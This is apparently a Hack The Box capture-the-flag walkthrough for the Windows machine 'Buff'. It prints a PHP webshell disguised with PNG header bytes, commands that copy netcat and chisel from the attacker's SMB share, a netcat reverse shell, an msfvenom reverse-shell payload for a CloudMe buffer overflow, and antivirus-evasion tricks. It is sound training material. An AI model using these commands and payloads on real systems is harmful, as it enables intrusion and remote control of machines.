## HTB: Buff Walkthrough

### Overview
- **Machine Name:** Buff
- **IP Address:** 10.10.10.198
- **OS:** [Windows](Windows)
- **Difficulty:** Easy
- **Points:** 20

---

### Recon

#### Nmap Scan
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.198
nmap -p 7680,8080 -sC -sV -oA scans/nmap-tcpscans 10.10.10.198
```
- Ports Open:
  - 8080: Apache [httpd](HTTP) 2.4.43 (Win64) PHP/7.4.6
  - 7680: Unknown

#### Gobuster
```bash
gobuster dir -u http://10.10.10.198:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 40 -o scans/gobuster-root-small-php
```
- Interesting Directories:
  - /upload.php
  - /register.php
  - /about.php
  - /admin

---

### Initial Exploit

#### Identifying the Application
- Web app identified as **Gym Management System** from **Projectworlds.in**
- Confirmed via `/README.md` and `/contact.php`

#### Searchsploit
```bash
searchsploit gym management
```
- Found: **Gym Management System 1.0 - Unauthenticated RCE** (48506.py)

#### Webshell Upload
- Upload bypass via double extension: `shell.php.png`
- Upload via `upload.php?id=yourname`
- PHP shell content starts with PNG magic bytes:
```php
\x89\x50\x4e\x47\x0d\x0a\x1a\n<?php echo shell_exec($_REQUEST["cmd"]); ?>
```
- Trigger shell:
```bash
curl http://10.10.10.198:8080/upload/yourname.php?cmd=whoami
```

#### Upgrade Shell
- Serve nc64.exe over SMB using impacket’s smbserver:
```bash
smbserver.py share . -smb2support -username df -password df
```
- On Buff:
```cmd
net use \\10.10.14.20\share /u:df df
copy \\10.10.14.20\share\nc64.exe C:\programdata\nc.exe
C:\programdata\nc.exe -e cmd.exe 10.10.14.20 443
```
- Start listener:
```bash
rlwrap nc -lvnp 443
```

---

### Privilege Escalation

#### Enumeration
- Local port 8888 used by `CloudMe.exe`
- Found `CloudMe_1112.exe` in Downloads

#### Searchsploit
```bash
searchsploit cloudme
```
- Found: **CloudMe 1.11.2 - Buffer Overflow (48389.py)**

#### Setup Tunnel with Chisel
- Upload chisel client:
```cmd
copy \\10.10.14.20\share\chisel.exe C:\programdata\chisel.exe
```
- Start server on Kali:
```bash
chisel server -p 8000 --reverse
```
- Connect from Buff:
```cmd
chisel.exe client 10.10.14.20:8000 R:8888:127.0.0.1:8888
```

#### Modify Exploit Payload
- Use msfvenom to generate reverse shell:
```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
```
- Replace payload in `48389.py`
- Run exploit:
```bash
python3 cloudme-bof.py
```
- Get admin shell at listener

---

### Flags
- **User:** `e9ff7f33************************`
- **Root:** `0e2cf4e5************************`

---

### Beyond Root

#### Gym Exploit Analysis
- Exploit uses `/upload.php` with `id` param to upload shell
- Bypasses extension filter with `.php.png`
- Bypasses MIME filter with correct Content-Type and PNG header

#### Defender Evasion
- Upload fails with `system()` due to AV
- Upload succeeds with `shell_exec()`
- Alternate bypass: inject HTML tags to evade Defender signature detection

---

### Summary
HTB: Buff is an excellent beginner-friendly box emulating an OSCP-style workflow: from web exploitation to bypassing upload filters, to privilege escalation through buffer overflow in a local service. The use of Chisel for tunneling and awareness of AV evasion techniques adds valuable depth to the learning experience.

